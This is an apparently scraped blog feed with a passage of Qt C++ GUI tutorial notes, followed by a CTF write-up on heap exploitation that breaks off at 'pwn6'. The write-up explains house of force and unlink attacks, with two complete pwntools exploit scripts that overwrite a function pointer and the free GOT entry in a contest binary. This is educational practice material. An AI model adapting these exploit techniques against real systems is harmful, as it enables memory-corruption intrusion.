QMainWindow"></a>0x04 QMainWindow</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png" alt="image-20201208225426943"></p><h3 id="1-菜单栏"><a href="#1-菜单栏" class="headerlink" title="1.菜单栏"></a>1.菜单栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//菜单栏</span></span><br><span class="line"><span class="comment">//菜单栏最多有一个</span></span><br><span class="line"><span class="comment">//创建菜单栏</span></span><br><span class="line">QMenuBar * bar = menuBar();</span><br><span class="line"><span class="comment">//将菜单栏放入到窗口中</span></span><br><span class="line">setMenuBar(bar);</span><br><span class="line"><span class="comment">//创建菜单</span></span><br><span class="line">QMenu * fileMenu = bar-&gt;addMenu(<span class="string">"文件"</span>);</span><br><span class="line">QMenu * editMenu = bar-&gt;addMenu(<span class="string">"编辑"</span>);</span><br><span class="line"><span class="comment">//创建菜单项</span></span><br><span class="line"><span class="comment">//fileMenu-&gt;addAction("新建");</span></span><br><span class="line">QAction * action1 = fileMenu-&gt;addAction(<span class="string">"新建"</span>);</span><br><span class="line"><span class="comment">//添加分隔符</span></span><br><span class="line">fileMenu-&gt;addSeparator();</span><br><span class="line">QAction * action2 = fileMenu-&gt;addAction(<span class="string">"打开"</span>);</span><br></pre></td></tr></table></figure><h3 id="2-工具栏"><a href="#2-工具栏" class="headerlink" title="2.工具栏"></a>2.工具栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//工具栏</span></span><br><span class="line"><span class="comment">//工具栏 可以有多个</span></span><br><span class="line">QToolBar * toolBar = <span class="keyword">new</span> QToolBar(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//工具栏区域</span></span><br><span class="line">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class="line"><span class="comment">//设置工具栏区域 只允许左右停靠</span></span><br><span class="line">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class="line"><span class="comment">//设置浮动</span></span><br><span class="line">toolBar-&gt;setFloatable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//设置移动</span></span><br><span class="line">toolBar-&gt;setMovable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//设置内容</span></span><br><span class="line"><span class="comment">//toolBar-&gt;addAction("新建");</span></span><br><span class="line">toolBar-&gt;addAction(action1);</span><br><span class="line"><span class="comment">//添加分割线</span></span><br><span class="line">toolBar-&gt;addSeparator();</span><br><span class="line">toolBar-&gt;addAction(action2);</span><br><span class="line"><span class="comment">//工具栏添加控件</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">"点这里"</span>,<span class="keyword">this</span>);</span><br><span class="line">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure><h3 id="3-状态栏"><a href="#3-状态栏" class="headerlink" title="3.状态栏"></a>3.状态栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//状态栏</span></span><br><span class="line"><span class="comment">//状态栏可以有多个</span></span><br><span class="line">QStatusBar * stBar = statusBar();</span><br><span class="line"><span class="comment">//设置到窗口</span></span><br><span class="line">setStatusBar(stBar);</span><br><span class="line"><span class="comment">//添加标签控件</span></span><br><span class="line"><span class="comment">//左侧提示</span></span><br><span class="line">QLabel * label = <span class="keyword">new</span> QLabel(<span class="string">"左侧信息"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addWidget(label);</span><br><span class="line"><span class="comment">//右侧提示</span></span><br><span class="line">QLabel * label1 = <span class="keyword">new</span> QLabel(<span class="string">"右侧信息"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure><h3 id="4-浮动窗口"><a href="#4-浮动窗口" class="headerlink" title="4.浮动窗口"></a>4.浮动窗口</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//铆接部件(浮动窗口)</span></span><br><span class="line"><span class="comment">//铆接部件 可以有多个</span></span><br><span class="line">QDockWidget * dock = <span class="keyword">new</span> QDockWidget(<span class="string">"浮动"</span>,<span class="keyword">this</span>);</span><br><span class="line">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class="line"><span class="comment">//设置停靠区域</span></span><br><span class="line">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure><h3 id="5-核心部件"><a href="#5-核心部件" class="headerlink" title="5.核心部件"></a>5.核心部件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置中心部件(只能有一个)</span></span><br><span class="line">QTextEdit * edit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">setCentralWidget(edit);</span><br></pre></td></tr></table></figure><h2 id="0x05-资源文件"><a href="#0x05-资源文件" class="headerlink" title="0x05 资源文件"></a>0x05 资源文件</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png" alt="image-20201209001543539"></p><h2 id="0x06-对话框"><a href="#0x06-对话框" class="headerlink" title="0x06 对话框"></a>0x06 对话框</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建按钮 弹出对话框</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class="line">        <span class="comment">//模态对话框 （不可以对其它窗口进行操作）</span></span><br><span class="line">        <span class="comment">//非模态对话框 （可以对其他窗口进行操作）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//模态对话框的创建</span></span><br><span class="line">        QDialog dlg(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//对话框的大小</span></span><br><span class="line">        dlg.resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//对话框阻塞</span></span><br><span class="line">        dlg.exec();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非模态对话框</span></span><br><span class="line">        QDialog *dlg2 = <span class="keyword">new</span> QDialog(<span class="keyword">this</span>);</span><br><span class="line">        dlg2-&gt;resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        dlg2-&gt;show();</span><br><span class="line">        <span class="comment">//关闭释放内存</span></span><br><span class="line">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="2-标准对话框"><a href="#2-标准对话框" class="headerlink" title="2.标准对话框"></a>2.标准对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//消息对话框</span></span><br><span class="line"><span class="comment">//错误对话框</span></span><br><span class="line"><span class="comment">//QMessageBox::critical(this,"错误","错误");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//信息对话框</span></span><br><span class="line"><span class="comment">//QMessageBox::information(this,"消息","消息");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提问对话框</span></span><br><span class="line"><span class="comment">//参数1 父亲 参数2 标题 参数3 提示内容 参数4 按键类型</span></span><br><span class="line">QMessageBox::question(<span class="keyword">this</span>,<span class="string">"提问"</span>,<span class="string">"提问"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class="line"><span class="keyword">if</span>(QMessageBox::Save==QMessageBox::question(<span class="keyword">this</span>,<span class="string">"提问"</span>,<span class="string">"提问"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"保存"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-其他对话框"><a href="#3-其他对话框" class="headerlink" title="3.其他对话框"></a>3.其他对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//颜色对话框</span></span><br><span class="line"><span class="comment">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class="line"><span class="comment">//文件对话框</span></span><br><span class="line"><span class="comment">//参数1 父亲 参数2 标题 参数3 目录 参数4 文件格式</span></span><br><span class="line"><span class="comment">//QString str = QFileDialog::getOpenFileName(this,"打开","c://","(*.txt)");</span></span><br><span class="line"><span class="comment">//字体对话框</span></span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line">QFontDialog::getFont(&amp;flag,QFont(<span class="string">"华文彩云"</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure><h2 id="0x07-界面布局"><a href="#0x07-界面布局" class="headerlink" title="0x07 界面布局"></a>0x07 界面布局</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png" alt="image-20201210092318304"></p><h2 id="0x08-控件"><a href="#0x08-控件" class="headerlink" title="0x08 控件"></a>0x08 控件</h2><h3 id="1-按钮"><a href="#1-按钮" class="headerlink" title="1.按钮"></a>1.按钮</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png" alt="image-20201210100503686"></p><h3 id="2-树控件"><a href="#2-树控件" class="headerlink" title="2.树控件"></a>2.树控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//树控件的使用</span></span><br><span class="line"><span class="comment">//水平头</span></span><br><span class="line">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class="string">"英雄"</span> &lt;&lt; <span class="string">"英雄介绍"</span>);</span><br><span class="line"><span class="comment">//加载顶层的节点</span></span><br><span class="line">QTreeWidgetItem * liitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"力量"</span>);</span><br><span class="line">QTreeWidgetItem * spitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"速度"</span>);</span><br><span class="line">QTreeWidgetItem * faitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"法力"</span>);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure><h3 id="3-table控件"><a href="#3-table控件" class="headerlink" title="3.table控件"></a>3.table控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//table控件</span></span><br><span class="line">    <span class="comment">//设置列数</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setColumnCount(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//设置水平表头</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class="string">"姓名"</span> &lt;&lt;<span class="string">"性别"</span> &lt;&lt; <span class="string">"年龄"</span>);</span><br><span class="line">    <span class="comment">//设置行数</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setRowCount(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//设置正文</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setItem(<span class="number">0</span>,<span class="number">0</span>,<span class="keyword">new</span> QTableWidgetItem(<span class="string">"压缩"</span>));</span><br><span class="line">    <span class="comment">//列表</span></span><br><span class="line">    QList&lt;QString&gt; namelist;</span><br><span class="line">    QStringList sexlist;</span><br><span class="line">    sexlist &lt;&lt; <span class="string">"男"</span> &lt;&lt; <span class="string">"男"</span> &lt;&lt; <span class="string">"男"</span>  &lt;&lt; <span class="string">"男"</span>；</span><br><span class="line">    namelist &lt;&lt; <span class="string">"ll"</span> &lt;&lt; <span class="string">"aa"</span> &lt;&lt; <span class="string">"11"</span>;</span><br></pre></td></tr></table></figure><h3 id="4-其他控件"><a href="#4-其他控件" class="headerlink" title="4.其他控件"></a>4.其他控件</h3><p>需要的时去看库吧</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png" alt="image-20201210104641479"></p><h2 id="0x09-Qfile文件读写"><a href="#0x09-Qfile文件读写" class="headerlink" title="0x09 Qfile文件读写"></a>0x09 Qfile文件读写</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png" alt="image-20201214083900742"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png" alt="image-20201214083912652"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;程序设计综合实践&quot;&gt;&lt;a href=&quot;#程序设计综合实践&quot; class=&quot;headerlink&quot; title=&quot;程序设计综合实践&quot;&gt;&lt;/a&gt;程序设计综合实践&lt;/h1&gt;&lt;p&gt;图形化编程&lt;/p&gt;
&lt;p&gt;这不同语言分数还不太一样，最后用Qt了&lt;/p&gt;
&lt;p&gt;四个星期四个</summary>
      
    
    
    
    <category term="Qt" scheme="https://pz1o.top/categories/Qt/"/>
    
    
    <category term="Qt" scheme="https://pz1o.top/tags/Qt/"/>
    
    <category term="实验" scheme="https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>新生赛复现</title>
    <link href="https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-06T14:22:34.000Z</published>
    <updated>2020-12-23T09:07:46.902Z</updated>
    
    <content type="html"><![CDATA[<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>终于考完试了，这考前学真不是人干的，上课还是得听一听</p><p>复现一下这几道题，顺便学习堆的知识</p><hr><p>淦 我是fw 拖了五天 终于来复现了</p><p>但发现堆已经忘得差不多了</p><p>先复习堆的基础知识</p><p><a href="https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>官方wp</p><blockquote><p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p><p>关于house of force不懂得的可以参考这篇文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><p>先来看一下house of force</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a><strong>house of force</strong></h2><p><strong>利用条件</strong></p><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ul><p><strong>利用步骤</strong></p><p>(1)首先先泄露出堆地址。</p><p>(2)利用堆溢出，将top chunk的size域修改为很大的数</p><p>(3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。</p><p>(4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。</p><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p><p>因为是第一次弄堆题 所以尽量弄得清楚一点</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png" alt="image-20201213122054112"></p><p>还未进入菜单 堆中情况</p><p>两个指针</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png" alt="image-20201213122653935"></p><p>添加一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">"aaaa"</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png" alt="image-20201213140931866"></p><p>修改top chunk大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png" alt="image-20201213170620443"></p><p>这时 我们需要把top指针指向堆底，从而改变函数指针</p><p>那我们应该怎么申请大小呢，我们需要“后撤步”，就是负向申请地址。那大小呢，最起码应该是0x40+0x20，然后加上一个头需要的地址（0xf）与尾部top前可用的空间（0x8）。</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png" alt="image-20201213175814153"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>负向申请然后打过去，然后这里应该可以只要申请足够大 然后把里面内容全覆盖为后门函数 直接调用应该都可以</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>可以去看我刚总结的堆</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level = 'debug'</span><br><span class="line">p = process('./pwn5')</span><br><span class="line">#p = remote('219.219.61.234','10014')</span><br><span class="line">elf = ELF('./pwn5')</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line">def add(<span class="built_in">size</span>,con):</span><br><span class="line">p.sendlineafter('Your choice:','2')</span><br><span class="line">p.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class="line">p.sendafter('Plz input the name:',con)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter('Your choice:','4')</span><br><span class="line">p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter('Your choice:','1')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">change</span><span class="params">(idx,<span class="built_in">size</span>,con)</span>:</span></span><br><span class="line">    p.sendlineafter('Your choice:','3')</span><br><span class="line">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class="line">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class="line">buf = <span class="number">0x06020b8</span></span><br><span class="line">sys = <span class="number">0x400D1B</span></span><br><span class="line">add(0x60,'ccc')</span><br><span class="line">add(0x58,'aaa')</span><br><span class="line">add(0x80,'bbb')</span><br><span class="line">add(0x60,'eee')</span><br><span class="line">add(0x60,'fff')</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(buf - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x50</span>)+p8(<span class="number">0x90</span>) </span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0x60</span>)*<span class="number">3</span>+ p64(<span class="number">0x6020a8</span>))</span><br><span class="line">change(1,0x40,p64(elf.got['free']))</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,p64(sys)*<span class="number">2</span>)</span><br><span class="line"><span class="meta"># delete(3)</span></span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h1><blockquote><p>change函数中存在单字节溢出漏洞</p><figure class="highlight 